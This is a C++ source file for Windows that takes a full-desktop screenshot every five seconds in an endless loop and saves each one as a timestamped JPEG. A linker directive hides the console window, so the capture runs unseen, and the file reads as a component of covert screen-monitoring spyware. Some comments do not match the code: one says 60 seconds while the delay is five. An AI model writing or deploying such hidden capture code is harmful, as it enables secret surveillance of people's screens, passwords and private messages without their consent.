#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

#include"screenshot.h"

void screenshot(string file) {
	ULONG_PTR gdiplustoken;
	GdiplusStartupInput gdistartupinput;
	GdiplusStartupOutput gdistartupoutput;

	gdistartupinput.SuppressBackgroundThread = true;
	GdiplusStartup(&gdiplustoken, &gdistartupinput, &gdistartupoutput); //start GDI+

	HDC dc = GetDC(GetDesktopWindow());//get desktop content
	HDC dc2 = CreateCompatibleDC(dc);	 //copy context

	RECT rc0kno;  // rectangle  Object

	GetClientRect(GetDesktopWindow(), &rc0kno);// get desktop size;
	int w = rc0kno.right - rc0kno.left;//width
	int h = rc0kno.bottom - rc0kno.top;//height

	HBITMAP hbitmap = CreateCompatibleBitmap(dc, w, h);  //create bitmap
	HBITMAP holdbitmap = (HBITMAP)SelectObject(dc2, hbitmap);

	BitBlt(dc2, 0, 0, w, h, dc, 0, 0, SRCCOPY);  //copy pixel from pulpit to bitmap
	Bitmap* bm = new Bitmap(hbitmap, NULL);

	UINT num;
	UINT size;

	ImageCodecInfo* imagecodecinfo;
	GetImageEncodersSize(&num, &size); //get count of codec

	imagecodecinfo = (ImageCodecInfo*)(malloc(size));
	GetImageEncoders(num, size, imagecodecinfo);//get codec

	CLSID clsidEncoder;

	for (int i = 0; i < num; i++)
	{
		if (wcscmp(imagecodecinfo[i].MimeType, L"image/jpeg") == 0)
			clsidEncoder = imagecodecinfo[i].Clsid;   //get jpeg codec id

	}

	free(imagecodecinfo);

	wstring ws;
	ws.assign(file.begin(), file.end());  //sring to wstring
	bm->Save(ws.c_str(), &clsidEncoder);   //save in jpeg format
	SelectObject(dc2, holdbitmap);  //Release Objects
	DeleteObject(dc2);
	DeleteObject(hbitmap);

	ReleaseDC(GetDesktopWindow(), dc);
	GdiplusShutdown(gdiplustoken);

}

int screenmain()
{

	while (TRUE)
	{
		SYSTEMTIME st;  // create object of system time 
		GetLocalTime(&st);
		int year = st.wYear;  // extract year from system time
		int month = st.wMonth; // extract month from system time
		int day = st.wDay; // extract year day system time
		int hour = st.wHour; // extract year hours system time
		int mintue = st.wMinute; // extract mintue from system time

		string yearS = to_string(year);
		yearS += "_";
		string monthS = to_string(month);
		monthS += "-";
		string dayS = to_string(day);
		dayS += "-";
		string hourS = to_string(hour);
		hourS += "H-";
		string mintueS = to_string(mintue);
		mintueS += "M.jpg";

		string startDate;
		startDate = dayS + monthS + yearS + hourS + mintueS;  // create complete string of date and time

		
			screenshot(startDate);   // send string to screenshot function
			Sleep(1000*5*1); // delay execution of function 60 Seconds
			
	} 
	
}